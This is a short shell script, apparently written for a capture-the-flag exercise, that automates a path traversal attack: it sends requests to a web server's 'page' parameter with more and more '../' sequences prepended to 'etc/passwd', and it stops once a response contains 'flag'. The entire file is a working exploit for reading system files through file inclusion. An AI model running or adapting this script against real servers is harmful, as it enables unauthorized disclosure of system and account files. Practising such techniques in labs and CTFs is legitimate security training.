#!/bin/sh
a=0
sufix="../"
prifix="etc/passwd"
ip_address=$1
link="http://$ip_address/?page="
while [ $a -lt 100 ] 
do 
    link="$link$sufix"
    response=$(curl -s ${link}$prifix | grep "flag")
    if [ ! -z "$response" ]; then
        echo "flag found : ${link}$prifix"
        echo $response
        break
    else
        echo  "try : "${link}$prifix " --> skip"
    fi
    a=`expr $a + 1` 
done 

